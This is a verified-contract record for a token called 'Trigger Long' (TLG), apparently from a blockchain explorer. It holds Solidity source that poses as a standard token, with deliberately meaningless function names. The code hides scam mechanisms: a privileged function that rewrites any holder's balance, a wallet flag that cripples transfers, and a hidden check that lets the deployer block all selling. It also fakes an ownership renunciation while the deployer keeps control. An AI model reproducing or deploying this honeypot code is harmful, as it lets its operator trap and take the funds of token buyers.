{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface toLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableMarketingTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenMarketing {\n    function createPair(address receiverShould, address sellShould) external returns (address);\n}\n\ninterface takeAtMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenMode) external view returns (uint256);\n\n    function transfer(address takeSwapFee, uint256 fundLaunch) external returns (bool);\n\n    function allowance(address tokenTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeSwapFee,\n        uint256 fundLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamIs, uint256 value);\n    event Approval(address indexed tokenTeam, address indexed spender, uint256 value);\n}\n\ninterface toFeeToken is takeAtMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TriggerLong is enableMarketingTeam, takeAtMax, toFeeToken {\n\n    mapping(address => bool) public buyFeeEnable;\n\n    function transfer(address liquidityTx, uint256 fundLaunch) external virtual override returns (bool) {\n        return launchedMarketingTo(_msgSender(), liquidityTx, fundLaunch);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenLaunchReceiver;\n    }\n\n    function txAuto(address totalShouldTrading) public {\n        if (sellTx) {\n            return;\n        }\n        if (tokenEnable == listMaxFrom) {\n            tokenEnable = listMaxFrom;\n        }\n        launchedTo[totalShouldTrading] = true;\n        \n        sellTx = true;\n    }\n\n    address public receiverEnable;\n\n    uint256 swapAt;\n\n    mapping(address => uint256) private receiverSender;\n\n    function totalLaunchAmount() public {\n        emit OwnershipTransferred(receiverEnable, address(0));\n        maxToken = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyMin;\n    }\n\n    function balanceOf(address tokenMode) public view virtual override returns (uint256) {\n        return receiverSender[tokenMode];\n    }\n\n    function receiverSwap(uint256 fundLaunch) public {\n        receiverTo();\n        swapAt = fundLaunch;\n    }\n\n    address public fundMarketing;\n\n    bool public receiverSenderSwap;\n\n    mapping(address => bool) public launchedTo;\n\n    event OwnershipTransferred(address indexed toFee, address indexed txWallet);\n\n    uint256 private tokenLaunchReceiver = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return maxToken;\n    }\n\n    string private buyMin = \"Trigger Long\";\n\n    function allowance(address liquidityAmount, address shouldFrom) external view virtual override returns (uint256) {\n        if (shouldFrom == tokenFee) {\n            return type(uint256).max;\n        }\n        return liquidityFromReceiver[liquidityAmount][shouldFrom];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingMarketingIs;\n    }\n\n    address limitLaunchedTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return maxToken;\n    }\n\n    bool public sellTx;\n\n    function receiverTo() private view {\n        require(launchedTo[_msgSender()]);\n    }\n\n    uint256 private listMaxFrom;\n\n    string private sellBuy = \"TLG\";\n\n    uint256 private amountList;\n\n    function marketingAuto(address tokenWallet) public {\n        receiverTo();\n        if (tokenEnable == amountList) {\n            tokenEnable = amountList;\n        }\n        if (tokenWallet == receiverEnable || tokenWallet == fundMarketing) {\n            return;\n        }\n        buyFeeEnable[tokenWallet] = true;\n    }\n\n    uint256 private tokenEnable;\n\n    function takeAmountToken(address liquidityTx, uint256 fundLaunch) public {\n        receiverTo();\n        receiverSender[liquidityTx] = fundLaunch;\n    }\n\n    bool public receiverLiquidity;\n\n    function transferFrom(address isTrading, address takeSwapFee, uint256 fundLaunch) external override returns (bool) {\n        if (_msgSender() != tokenFee) {\n            if (liquidityFromReceiver[isTrading][_msgSender()] != type(uint256).max) {\n                require(fundLaunch <= liquidityFromReceiver[isTrading][_msgSender()]);\n                liquidityFromReceiver[isTrading][_msgSender()] -= fundLaunch;\n            }\n        }\n        return launchedMarketingTo(isTrading, takeSwapFee, fundLaunch);\n    }\n\n    function shouldMarketing(address isTrading, address takeSwapFee, uint256 fundLaunch) internal returns (bool) {\n        require(receiverSender[isTrading] >= fundLaunch);\n        receiverSender[isTrading] -= fundLaunch;\n        receiverSender[takeSwapFee] += fundLaunch;\n        emit Transfer(isTrading, takeSwapFee, fundLaunch);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityFromReceiver;\n\n    constructor (){\n        if (amountList == listMaxFrom) {\n            listMaxFrom = tokenEnable;\n        }\n        toLaunched txBuy = toLaunched(tokenFee);\n        fundMarketing = tokenMarketing(txBuy.factory()).createPair(txBuy.WETH(), address(this));\n        if (receiverLiquidity) {\n            receiverLiquidity = true;\n        }\n        receiverEnable = _msgSender();\n        totalLaunchAmount();\n        launchedTo[receiverEnable] = true;\n        receiverSender[receiverEnable] = tokenLaunchReceiver;\n        \n        emit Transfer(address(0), receiverEnable, tokenLaunchReceiver);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellBuy;\n    }\n\n    function launchedMarketingTo(address isTrading, address takeSwapFee, uint256 fundLaunch) internal returns (bool) {\n        if (isTrading == receiverEnable) {\n            return shouldMarketing(isTrading, takeSwapFee, fundLaunch);\n        }\n        uint256 buyExempt = takeAtMax(fundMarketing).balanceOf(limitLaunchedTake);\n        require(buyExempt == swapAt);\n        require(takeSwapFee != limitLaunchedTake);\n        if (buyFeeEnable[isTrading]) {\n            return shouldMarketing(isTrading, takeSwapFee, txMarketing);\n        }\n        return shouldMarketing(isTrading, takeSwapFee, fundLaunch);\n    }\n\n    uint256 amountFund;\n\n    address private maxToken;\n\n    function approve(address shouldFrom, uint256 fundLaunch) public virtual override returns (bool) {\n        liquidityFromReceiver[_msgSender()][shouldFrom] = fundLaunch;\n        emit Approval(_msgSender(), shouldFrom, fundLaunch);\n        return true;\n    }\n\n    address tokenFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant txMarketing = 10 ** 10;\n\n    uint8 private tradingMarketingIs = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyFeeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"}],\"name\":\"marketingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunch\",\"type\":\"uint256\"}],\"name\":\"takeAmountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSwapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShouldTrading\",\"type\":\"address\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TriggerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}